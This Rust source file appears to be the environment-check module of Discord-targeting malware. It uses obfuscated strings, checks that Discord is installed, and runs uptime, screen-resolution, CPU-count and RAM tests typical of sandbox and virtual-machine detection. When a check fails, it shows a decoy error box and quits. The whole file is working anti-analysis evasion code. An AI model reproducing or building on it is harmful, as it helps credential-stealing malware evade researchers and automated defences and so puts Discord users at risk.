use std::path::PathBuf;
use std::process;
use crate::encrypted::*;

fn fail_and_exit() {
    crate::core::api::message_box(&s_error_title(), &s_error_text(), crate::core::api::MB_OK | crate::core::api::MB_ICONERROR);
    process::exit(1);
}

fn is_any_discord_installed() -> bool {
    let local_appdata = match std::env::var(s_localappdata()) {
        Ok(path) => PathBuf::from(path),
        Err(_) => return false,
    };

    let candidates = [
        local_appdata.join(s_sandbox_discord()),
        local_appdata.join(s_sandbox_discord_ptb()),
        local_appdata.join(s_sandbox_discord_canary()),
        local_appdata.join(s_programs_discord()),
        PathBuf::from(s_pf_discord()),
        PathBuf::from(s_pf86_discord()),
    ];

    for path in candidates {
        if path.exists() && path.is_dir() {
            return true;
        }
    }
    false
}

fn check_uptime() -> bool {
    crate::core::api::check_uptime()
}

fn check_resolution() -> bool {
    crate::core::api::check_resolution()
}

fn check_cpu_count() -> bool {
    crate::core::api::check_cpu_count()
}

fn check_ram() -> bool {
    crate::core::api::check_ram()
}

pub fn verify_environment() {
    if !is_any_discord_installed()
        || !check_uptime()
        || !check_resolution()
        || !check_cpu_count()
        || !check_ram()
    {
        fail_and_exit();
    }
}

